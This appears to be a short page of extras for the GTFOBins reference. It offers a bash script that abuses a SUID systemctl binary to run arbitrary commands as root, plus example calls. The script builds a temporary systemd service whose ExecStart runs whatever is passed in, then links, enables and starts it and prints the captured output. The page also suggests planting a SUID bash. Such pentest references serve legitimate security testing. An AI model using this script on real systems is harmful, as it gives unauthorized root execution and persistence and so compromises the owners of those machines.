# GTFOBins - extras

Some scripts, utilities, notes... complementary to GTFOBins.

<hr class="sl">

## ⚡ SUID `systemctl` script

Description: this script make it easier to run several commands using `systemctl`. Alternatively, you can create a bash with the SUID bit.

<div class="row row-cols-md-2 mt-4"><div>

Create a file `script.sh` with the contents below

```bash
TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=/bin/sh -c '$@ > /tmp/output'
[Install]
WantedBy=multi-user.target" > $TF
systemctl -f link $TF
systemctl -f enable --now $TF
cat /tmp/output
```
</div><div>

Calls

```bash
$ chmod +x script.sh
$ ./script.sh id
$ ./script.sh ls -la
```
</div></div>